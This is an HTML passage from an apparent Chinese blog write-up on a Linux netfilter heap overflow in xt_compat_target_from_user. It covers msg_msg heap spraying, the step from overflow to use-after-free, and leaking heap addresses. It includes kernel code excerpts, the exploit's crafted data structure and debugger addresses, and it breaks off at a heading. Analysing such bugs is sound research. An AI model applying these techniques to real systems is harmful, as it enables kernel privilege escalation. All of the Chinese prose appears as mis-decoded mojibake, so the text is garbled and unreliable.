      <p>è¿™ä¸ªå‡½æ•°å’Œæ¥ä¸‹æ¥çš„æ¼æ´å‡½æ•°<code>xt_compat_target_from_user</code>å¯ä»¥è¯´åŸºæœ¬ä¸€è‡´ï¼Œè§‚å¯Ÿä¸‹å›¾å³å¯çœ‹åˆ°ï¼Œå…·ä½“ç”¨æ¥å¹²ä»€ä¹ˆä¸å¤ªæ¸…æ¥šï¼Œä½†æ˜¯ä½œç”¨ä¹Ÿæ˜¯ç›¸å…³çš„padå¡«å……<code>newinfo</code>ä¸Šçš„æ•°æ®ã€‚æ‰“äº†ä¸€ä¸ªå¾ªç¯<code>xt_ematch_foreach</code>ï¼Œåœ¨æˆ‘ä»¬å…³æ³¨çš„è¿™ä¸ªæ¼æ´é‡Œï¼Œå…¶ä½œç”¨å°±åªæ˜¯ä½¿å¾—<code>*dstptr + n * msize</code>ï¼Œä¹Ÿå°±æ˜¯åœ¨æˆ‘ä»¬å…³å¿ƒçš„æœ€ç»ˆå€¼ä¸º<code>newinfo_addr+0x40+0x70+n * msize</code>ï¼Œä»è€Œä½¿å¾—åœ¨è¿›å…¥<code>xt_compat_target_from_user</code>ä¹‹å‰ï¼Œ<code>*dstptr</code>ä¸Šçš„å †å—åœ°å€å·²ç»ç§»åŠ¨åˆ°æœ«å°¾äº†ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214923917.png" alt="image-20220507214923917" style="zoom: 80%;" />        <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214947982.png" alt="image-20220507214947982" style="zoom: 80%;" /></p>
<p>åšäº†ä¸€ä¸ªæ•°æ®å¯¹æ¯”ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">newinfoï¼š				0xffff888006a2a000</span><br><span class="line">tï¼š						0xffff888006a2afda</span><br><span class="line">t-&gt;dataï¼š				0xffff888006a2affa</span><br><span class="line">target-&gt;targetsizeï¼š		0x4</span><br><span class="line">dstptrï¼š</span><br><span class="line">	xt_compat_match_from_userçš„æ—¶å€™ï¼š</span><br><span class="line">		0xffffc900002b7ad0-&gt;0xffff888006a2a0b0</span><br><span class="line">	xt_compat_target_from_userçš„æ—¶å€™ï¼š</span><br><span class="line">		0xffffc900002b7ad0-&gt;0xffff888006a2afda</span><br></pre></td></tr></table></div></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ç»è¿‡<code>xt_compat_match_from_user</code>å‡½æ•°ä¹‹åï¼Œä¿å­˜åœ¨<code>*dstptr</code>ä¸Šçš„æ¼æ´å †çš„åœ°å€å·²ç»åŠ ä¸Šäº†<code>0xf2a</code>ã€‚</p>

        <h2 id="6-xt-compat-target-from-user"   >
          <a href="#6-xt-compat-target-from-user" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-xt-compat-target-from-user" class="headerlink" title="6.xt_compat_target_from_user()"></a>6.xt_compat_target_from_user()</h2>
      <p>ç»ˆäºæ¥åˆ°æœ€åçš„æ¼æ´å‡½æ•°</p>
<ul>
<li><p>å‚æ•°ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(struct xt_entry_target *t, <span class="keyword">void</span> **dstptr,</span><br><span class="line">				<span class="keyword">unsigned</span> <span class="keyword">int</span> *size)</span><br></pre></td></tr></table></div></figure></li>
<li><p>åœ°å€ï¼š<code>0xFFFFFFFF81A82F75</code></p>
</li>
<li><p>ä»‹ç»ï¼š</p>
<ul>
<li><p>ä¸»è¦å…³æ³¨å˜é‡</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¼ å…¥çš„</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> *<span class="title">t</span>;</span></span><br><span class="line"><span class="keyword">void</span> **dstptr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *size;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è‡ªå®šä¹‰çš„</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xt_target</span> *<span class="title">target</span> =</span> t-&gt;u.kernel.target;</span><br><span class="line"><span class="keyword">int</span> pad, off = xt_compat_target_offset(target);</span><br></pre></td></tr></table></div></figure></li>
<li><p>ç›¸å…³æ“ä½œï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xt_compat_target_from_user</span><span class="params">(struct xt_entry_target *t, <span class="keyword">void</span> **dstptr,</span></span></span><br><span class="line"><span class="params"><span class="function">				<span class="keyword">unsigned</span> <span class="keyword">int</span> *size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xt_target</span> *<span class="title">target</span> =</span> t-&gt;u.kernel.target;</span><br><span class="line">	<span class="keyword">int</span> pad, off = xt_compat_target_offset(target);</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//å³è·å–æŒ‡é’ˆä¸ºnewinfo+0x40+0x70+0xf2a</span></span><br><span class="line">	t = *dstptr;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//è¿›è¡Œ8å­—èŠ‚å¯¹é½</span></span><br><span class="line">	pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br><span class="line">	<span class="keyword">if</span> (pad &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">//target-&gt;targetsizeä¸º4ï¼Œåˆ™æœ€ç»ˆä¼ å…¥çš„åœ°å€ä¸º</span></span><br><span class="line">        <span class="comment">//newinfo+0x40+0x70+0xf2a+0x20+0x4=newinfo+0xffe</span></span><br><span class="line">        <span class="comment">//åŒæ—¶padåœ¨ç»è¿‡å¯¹é½ä¹‹åä¹Ÿä¸º4,é‚£ä¹ˆå°±æº¢å‡º2ä¸ªå­—èŠ‚</span></span><br><span class="line">		<span class="built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="number">0</span>, pad);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h2 id="æ€»ç»“-1"   >
          <a href="#æ€»ç»“-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2>
      <p>é€šè¿‡ä¸Šè¿°åˆ†æå¯ä»¥çœ‹åˆ°ï¼Œå…¶å®è¯¥æ¼æ´çš„æˆå› å°±æ˜¯</p>

        <h3 id="1-æ§åˆ¶å †å—å¤§å°å’Œåç§»"   >
          <a href="#1-æ§åˆ¶å †å—å¤§å°å’Œåç§»" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ§åˆ¶å †å—å¤§å°å’Œåç§»" class="headerlink" title="(1)æ§åˆ¶å †å—å¤§å°å’Œåç§»"></a>(1)æ§åˆ¶å †å—å¤§å°å’Œåç§»</h3>
      <p>é€šè¿‡æ§åˆ¶ä¼ å…¥çš„<code>&amp;data</code>ä¸­çš„<code>pad</code>çš„å¤§å°æ¥æ§åˆ¶ç”³è¯·çš„å †å—çš„å¤§å°å’Œ<code>t-&gt;data</code>çš„ç›¸å¯¹åç§»åœ°å€</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipt_replace</span> <span class="title">replace</span>;</span>         <span class="comment">// 0x60</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> <span class="title">entry</span>;</span>            <span class="comment">// 0x70</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> <span class="title">match</span>;</span>         <span class="comment">// 0x20</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>];     </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> <span class="title">target</span>;</span>      <span class="comment">// 0x20</span></span><br><span class="line">&#125; data = &#123;<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></div></figure>

<p>ä¾‹å­ï¼š</p>
<p>æ¯”å¦‚bsauceå¸ˆå‚…æä¾›çš„EXPä¸­çš„padå¦‚ä¸‹ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯<code>kmalloc-4096</code>ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>]; </span><br></pre></td></tr></table></div></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬å°è¯•ä½¿ç”¨<code>kmalloc-2048</code>ï¼Œåœ¨ä»£ç ä¸­å‡å»0x800å¾—åˆ°å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span> - <span class="number">0x800</span>];</span><br></pre></td></tr></table></div></figure>

<p>æ–­ç‚¹æ‰“åœ¨<code>xt_alloc_table_info</code>ï¼Œåœ¨ç¬¬äºŒæ¬¡çš„<code>xt_alloc_table_info</code>ç”³è¯·æ¼æ´å †å—å¤„ï¼ŒæŸ¥çœ‹ä¸‹CPU0çš„<code>kmalloc-2048</code>ä¸­<code>freelist</code>ä¸­çš„å †å—ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200120767.png" alt="image-20220508200120767"></p>
<p>ç„¶å<code>finish</code>å½“å‰å‡½æ•°ï¼ŒæŸ¥çœ‹raxç”³è¯·åˆ°çš„å †å—ï¼Œå³ä¸º<code>freelist</code>ä¸­çš„ç¬¬ä¸€ä¸ªå †å—</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200155851.png" alt="image-20220508200155851"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯ä»CP0çš„<code>kmalloc-2048</code>ä¸­ç”³è¯·å¾—åˆ°çš„ï¼Œä¹‹ååœ¨<code>call memset</code>çš„æ¼æ´ç‚¹æ‰“ä¸‹æ–­ç‚¹ï¼ŒæŒ‰cç»§ç»­è¿è¡Œï¼Œæ–­ä¸‹æ¥</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508200407354.png" alt="image-20220508200407354"></p>
<p>å¯ä»¥çœ‹åˆ°ä»ç„¶è¿˜æ˜¯è¯¥æ¼æ´å †å—ï¼Œå¹¶ä¸”ç›¸å…³çš„åœ°å€ä¹Ÿç±»ä¼¼çš„ï¼Œpadä¸º0x4ï¼Œæ‰€ä»¥è¿˜æ˜¯å­˜åœ¨æ¼æ´ç‚¹çš„ã€‚</p>
<p>ä¸è¿‡å…·ä½“çš„ç»†èŠ‚æœ‰ç‚¹ä¸å¤ªæ¸…æ¥šï¼Œåç»­è¿˜å¾—è¡¥ä¸€è¡¥<code>Netfilter</code>çš„ç›¸å…³çŸ¥è¯†ã€‚</p>

        <h3 id="2-æ§åˆ¶å¡«å……pad"   >
          <a href="#2-æ§åˆ¶å¡«å……pad" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ§åˆ¶å¡«å……pad" class="headerlink" title="(2)æ§åˆ¶å¡«å……pad"></a>(2)æ§åˆ¶å¡«å……pad</h3>
      <p>é€šè¿‡æ§åˆ¶ä¼ å…¥çš„<code>data.target.u.user.revision</code>æ¥æ§åˆ¶<code>target-&gt;targetsize</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.target.u.user.revision = <span class="number">1</span>;</span><br></pre></td></tr></table></div></figure>

<p>ä¸åŒçš„<code>version</code>æ§åˆ¶ä¸åŒçš„<code>target-&gt;targetsize</code>ã€‚</p>
<p>è¿™é‡Œç»è¿‡æˆ‘è‡ªå·±çš„å®é™…è°ƒè¯•ï¼Œæ„Ÿè§‰bsauceå¸ˆå‚…è¯´çš„æœ‰ç‚¹å°é—®é¢˜ã€‚æ¼æ´ç‚¹åº”è¯¥æ˜¯å‡ºåœ¨ä¸Šè¿°çš„<code>t-&gt;daii</code>åœ°å€æ²¡æœ‰0x8å¯¹é½çš„æ—¶å€™ï¼Œå¹¶ä¸”<code>target-&gt;size</code>ä¹Ÿæ²¡æœ‰0x8å¯¹é½çš„æƒ…å†µä¸‹ã€‚</p>
<p>æ­¤å¤–ï¼Œä¸åº”è¯¥åªæ˜¯2å­—èŠ‚æº¢å‡ºï¼Œæœ€å¤šåº”è¯¥å¯ä»¥åˆ°è¾¾4å­—èŠ‚æº¢å‡ºï¼Œå¦‚ä¸‹è®¾ç½®</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span> + <span class="number">0x2</span>]; </span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å¯ä»¥æº¢å‡º4ä¸ªå­—èŠ‚å†™0ï¼Œæœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220508204003227.png" alt="image-20220508204003227"></p>
<p>å¦‚æœå†åŠ padçš„è¯å°±ä¼šå¯¼è‡´ç”³è¯·å‡º<code>kmalloc-8192</code>çš„å †å—äº†</p>

        <h1 id="äºŒã€æ¼æ´åˆ©ç”¨"   >
          <a href="#äºŒã€æ¼æ´åˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€æ¼æ´åˆ©ç”¨" class="headerlink" title="äºŒã€æ¼æ´åˆ©ç”¨"></a>äºŒã€æ¼æ´åˆ©ç”¨</h1>
      
        <h2 id="1-æº¢å‡ºè½¬åŒ–UAF"   >
          <a href="#1-æº¢å‡ºè½¬åŒ–UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æº¢å‡ºè½¬åŒ–UAF" class="headerlink" title="1.æº¢å‡ºè½¬åŒ–UAF"></a>1.æº¢å‡ºè½¬åŒ–UAF</h2>
      <p>è¿™é‡Œæ¶‰åŠåˆ°ä¹‹å‰æåˆ°çš„<code>msg_msg</code>ç»“æ„ä½“åˆ©ç”¨ã€‚</p>

        <h3 id="1-å †å–·å†…å­˜å¸ƒå±€"   >
          <a href="#1-å †å–·å†…å­˜å¸ƒå±€" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å †å–·å†…å­˜å¸ƒå±€" class="headerlink" title="(1)å †å–·å†…å­˜å¸ƒå±€"></a>(1)å †å–·å†…å­˜å¸ƒå±€</h3>
      <p>é¦–å…ˆä½¿ç”¨<code>msgget</code>ç”³è¯·å¤šä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œç„¶åå¾€æ¯ä¸ªæ¶ˆæ¯é˜Ÿåˆ—å‘é€ä¸¤æ¡æ¶ˆæ¯ï¼Œä¸€æ¡ä¸»æ¶ˆæ¯<code>0x1000</code>ï¼Œä¸€æ¡è¾…åŠ©æ¶ˆæ¯<code>0x400</code>ã€‚è¿™é‡Œå‘é€æ¶ˆæ¯æ—¶éœ€è¦æ³¨æ„ä¸‹ï¼Œå…ˆéå†æ¯ä¸ªé˜Ÿåˆ—å‘é€ä¸»æ¶ˆæ¯ï¼Œç„¶åå†éå†æ¯ä¸ªé˜Ÿåˆ—å‘é€è¾…åŠ©æ¶ˆæ¯ã€‚è¿™æ ·è¿›è¡Œå †å–·æ„é€ åï¼Œå…¶ä¸­å°±ä¼šæœ‰éƒ¨åˆ†çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„ä¸»æ¶ˆæ¯è¿æˆä¸€æ•´å—åœ°å€è¿ç»­çš„å†…å­˜ï¼Œ<strong>è¾…åŠ©æ¶ˆæ¯ä¹Ÿéœ€è¦åœ°å€è¿æˆä¸€æ•´å—ï¼Œæ–¹ä¾¿åç»­æ³„éœ²åœ°å€ï¼Œä½†æ˜¯è¿™é‡Œä¸ºäº†å¥½çœ‹å°±æ²¡æœ‰è¿ä¸€èµ·</strong>ã€‚æ¯”å¦‚è¿™é‡Œç”³è¯·ä¸‰ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œæœ€ç»ˆå½¢æˆç±»ä¼¼çš„å¦‚ä¸‹å¸ƒå±€</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110107919.png" alt="image-20220513110107919"></p>
<p>å½“ç„¶è¿™é‡Œæ¯æ¡<code>0x1000</code>çš„ä¸»æ¶ˆæ¯ä¸­è¿˜æœ‰å‡ ä¸ª<code>struct msg_msgseg*</code>æ²¡æœ‰ç”»å‡ºæ¥</p>

        <h3 id="2-æ¼æ´æº¢å‡ºæ„é€ UAF"   >
          <a href="#2-æ¼æ´æº¢å‡ºæ„é€ UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ¼æ´æº¢å‡ºæ„é€ UAF" class="headerlink" title="(2)æ¼æ´æº¢å‡ºæ„é€ UAF"></a>(2)æ¼æ´æº¢å‡ºæ„é€ UAF</h3>
      <p>è¿™é‡Œæˆ‘ä»¬å…ˆé‡Šæ”¾ä¾‹å­ä¸­çš„ç¬¬äºŒæ¡ä¸»æ¶ˆæ¯ï¼Œè™½è¯´åœ¨ä¸»æ¶ˆæ¯ä¸­æ˜¯ç”±4ä¸ª<code>kmalloc(0x400)</code>ç”³è¯·å‡ºæ¥çš„4ä¸ªå †å—ï¼Œä½†æ˜¯å¦‚æœéƒ½é‡Šæ”¾ä¹‹åï¼Œå†…å­˜çš„å›æ”¶æœºåˆ¶å‘ç°è¿™å››ä¸ªåœ°å€è¿ç»­ä¸”éƒ½è¢«é‡Šæ”¾ï¼Œé‚£ä¹ˆå°±ä¼šå½’å¹¶æˆä¸€é¡µ<code>page</code>è¿˜ç»™<code>Slub</code>åˆ†é…å™¨ï¼Œå…¶å®å°±æ˜¯<code>kmalloc-4096</code>ã€‚ï¼ˆé‡Œé¢ç®—æ³•å¾ˆå¤æ‚ï¼Œä¸æ˜¯å¾ˆæ‡‚ï¼Œåé¢å†æ¥ç†æ¸…æ¥šã€‚ï¼‰ä¹‹åå†ç”³è¯·<code>0x1000</code>å¤§å°çš„å †å—ï¼Œå°±ä¼šä¼˜å…ˆä»è¿™é‡Œå–ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110346186.png" alt="image-20220513110346186"></p>
<p>ç„¶åæˆ‘ä»¬ä½¿ç”¨æ¼æ´ï¼Œè°ƒç”¨<code>socketopt</code>æ¥ç”³è¯·ä¸€ä¸ª<code>0x1000</code>çš„<code>xt_table_info</code>ï¼Œå°±ä¼šå æ®åˆ°æˆ‘ä»¬åˆšåˆšé‡Šæ”¾çš„<code>0x1000</code>å¤§å°çš„å †å—ä¸Šã€‚(è¿™ä¸ªå‰é¢æˆ‘ä»¬åˆ†æ<code>socketopt</code>ä¼šç”³è¯·ä¸¤ä¸ª<code>0x1000</code>å¤§å°çš„å †å—ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹‹åå°±æ˜¯å¤šé‡Šæ”¾å‡ æ¡ä¸»æ¶ˆæ¯å³å¯)è¿™æ ·åœ¨å æ®ä¹‹åï¼Œå‘ç”Ÿ2å­—èŠ‚æº¢å‡ºå†™0ï¼Œå°±å¯ä»¥æº¢å‡ºåˆ°ä¸‹ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—çš„<code>msg_msg</code>å¤´éƒ¨ç»“æ„çš„<code>struct list_head m_list.next</code>æŒ‡é’ˆï¼Œä»è€Œä½¿å¾—å…¶æŒ‡å‘å…¶ä»–ä½ç½®ï¼Œå¦‚æœè¿æ°”å¥½çš„è¯ï¼Œç”±äºè¾…åŠ©æ¶ˆæ¯ä¹Ÿæ˜¯å †å–·å½¢å¼ï¼Œä¸”å¤§å°ä¸º<code>0x400</code>ï¼Œé‚£ä¹ˆæº¢å‡ºä¸¤å­—èŠ‚å†™0å°±å¯èƒ½å°†è¯¥<code>next</code>æŒ‡é’ˆæŒ‡å‘å…¶ä»–çš„è¾…åŠ©æ¶ˆæ¯ï¼Œä»è€Œé€ æˆä¸¤ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­å…±å­˜ä¸€ä¸ªè¾…åŠ©æ¶ˆæ¯ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513110927931.png" alt="image-20220513110927931"></p>
<p>æ¯”å¦‚å›¾ä¸­æ¶ˆæ¯é˜Ÿåˆ—3ä¸­çš„ä¸»æ¶ˆæ¯å¤´éƒ¨çš„<code>struct list_head m_list.next</code>å³è¢«ä¿®æ”¹(é»‘è‰²ä¸ºæº¢å‡º2å­—èŠ‚å†™0)ï¼Œå¦‚çº¢è‰²ç®­å¤´æ‰€ç¤ºæŒ‡å‘äº†æ¶ˆæ¯é˜Ÿåˆ—1ä¸­çš„è¾…åŠ©æ¶ˆæ¯ï¼Œè¿™æ ·æ¶ˆæ¯é˜Ÿåˆ—1å’Œæ¶ˆæ¯é˜Ÿåˆ—3éƒ½æŒ‡å‘äº†åŒä¸€ä¸ªè¾…åŠ©æ¶ˆæ¯ï¼Œæ„æˆäº†å †å—<code>overlap</code>ã€‚ä¹‹åæˆ‘ä»¬é‡Šæ”¾æ¶ˆæ¯é˜Ÿåˆ—1ä¸­çš„è¾…åŠ©æ¶ˆæ¯ï¼Œè€Œæ¶ˆæ¯é˜Ÿåˆ—3ä»ç„¶æŒ‡å‘è¯¥è¾…åŠ©æ¶ˆæ¯ï¼Œæ„æˆäº†UAFã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513111337456.png"></p>
<p>ğŸ”ºæ³¨ï¼šåœ¨å®é™…çš„åˆ©ç”¨é‡Œï¼Œéœ€è¦è¿›è¡Œå †å–·å¸ƒå±€ï¼Œç”³è¯·å¾ˆå¤šçš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œè¿™æ—¶å€™å°±éœ€è¦ç”¨<code>MSG_COPY</code>æ ‡å¿—ä½æ¥è¿›è¡Œæ¶ˆæ¯è¯»å–ã€‚åˆ©ç”¨æ­¤æ ‡å¿—ä½è¯»å–æ¶ˆæ¯ä½†ä¸é‡Šæ”¾å †å—ï¼Œç„¶åå€ŸåŠ©å‘é€æ¶ˆæ¯æ—¶è‡ªå·±ç•™ä¸‹çš„ç´¢å¼•æ ‡å¿—æ¥åˆ¤æ–­åˆ°åº•æ˜¯å“ªä¸ªè¾…åŠ©æ¶ˆæ¯è¢«ä¸¤ä¸ªæ¶ˆæ¯é˜Ÿåˆ—æ‰€åŒ…å«ï¼Œè¿™æ ·å°±èƒ½è¿›è¡Œåç»­çš„åˆ©ç”¨ã€‚</p>

        <h2 id="2-åˆ©ç”¨UAF"   >
          <a href="#2-åˆ©ç”¨UAF" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-åˆ©ç”¨UAF" class="headerlink" title="2.åˆ©ç”¨UAF"></a>2.åˆ©ç”¨UAF</h2>
      
        <h3 id="1-æ³„éœ²å †åœ°å€"   >
          <a href="#1-æ³„éœ²å †åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ³„éœ²å †åœ°å€" class="headerlink" title="(1)æ³„éœ²å †åœ°å€"></a>(1)æ³„éœ²å †åœ°å€</h3>
      <p>é¦–å…ˆä½¿ç”¨<code>sk_buff</code>çš„<code>data</code>æ•°æ®å—æ¥å æ®è¯¥<code>UAF</code>å †å—ã€‚å‰é¢æåˆ°<code>sk_buff</code>çš„ç»“æ„å¤´ä½¿ç”¨ç‹¬æœ‰çš„ç¼“å†²æ± <code>kache</code>æ¥ç”³è¯·ï¼Œä½†æ˜¯å…¶<code>data</code>æ•°æ®å—è¿˜æ˜¯ä½¿ç”¨<code>kmalloc</code>å¸¸è§„è·¯çº¿æ¥ç”³è¯·é‡Šæ”¾(ä½¿ç”¨æ­£å¸¸çš„å‘åŒ…æ”¶åŒ…å³å¯å®Œæˆç”³è¯·é‡Šæ”¾)ï¼Œå¹¶ä¸”<code>size</code>å’Œ<code>data</code>å†…å®¹å®Œå…¨å¯æ§ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å®Œå…¨æ§åˆ¶è¯¥<code>UAF</code>å †å—ã€‚</p>
<p>ä¹‹åä¼ªé€ ä¸€ä¸ª<code>fake_msg_msg</code>ç»“æ„ä½“ï¼Œç»“æ„å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513112451162.png" alt="image-20220513112451162"></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /include/linux/msg.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span><span class="comment">//ä¸msg_queueæˆ–è€…å…¶ä»–çš„msg_msgç»„æˆåŒå‘å¾ªç¯é“¾è¡¨</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span><span class="comment">//å•å‘é“¾è¡¨ï¼ŒæŒ‡å‘è¯¥æ¡ä¿¡æ¯åé¢çš„msg_msgseg</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>æ”¹å¤§å…¶<code>m_ts</code>åŸŸï¼Œå°±å¯ä»¥è¯»å–å‡ºæ¶ˆæ¯é˜Ÿåˆ—2çš„è¾…åŠ©æ¶ˆæ¯å¤´éƒ¨æŒ‡é’ˆ<code>struct list_head m_list.next</code>çš„å€¼ï¼Œä»è€Œæ³„éœ²æ¶ˆæ¯é˜Ÿåˆ—2çš„<code>msg_msg_queue</code>çš„<code>struct list_head m_list</code>åŸŸçš„åœ°å€ï¼Œä¸ºä¸€ä¸ªå †åœ°å€ã€‚</p>
<p>ä¹‹åæˆ‘ä»¬ä¿®æ”¹<code>fake_msg_msg</code>çš„<code>struct msg_msgseg *next</code>æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸Šè¿°è·å¾—çš„æ¶ˆæ¯é˜Ÿåˆ—2çš„<code>struct list_head m_list</code>åŸŸçš„åœ°å€ï¼Œå°±èƒ½è¯»å‡ºè¯¥<code>struct list_head m_list</code>åŸŸçš„<code>prev</code>æŒ‡é’ˆï¼Œå³ä¸ºæ¶ˆæ¯é˜Ÿåˆ—2çš„è¾…åŠ©æ¶ˆæ¯çš„åœ°å€ï¼Œå‡å»<code>0x400</code>å³ä¸º<code>UAF</code>å †å—çš„åœ°å€</p>

        <h3 id="2-æ³„éœ²å†…æ ¸åŸºåœ°å€"   >
          <a href="#2-æ³„éœ²å†…æ ¸åŸºåœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ³„éœ²å†…æ ¸åŸºåœ°å€" class="headerlink" title="(2)æ³„éœ²å†…æ ¸åŸºåœ°å€"></a>(2)æ³„éœ²å†…æ ¸åŸºåœ°å€</h3>
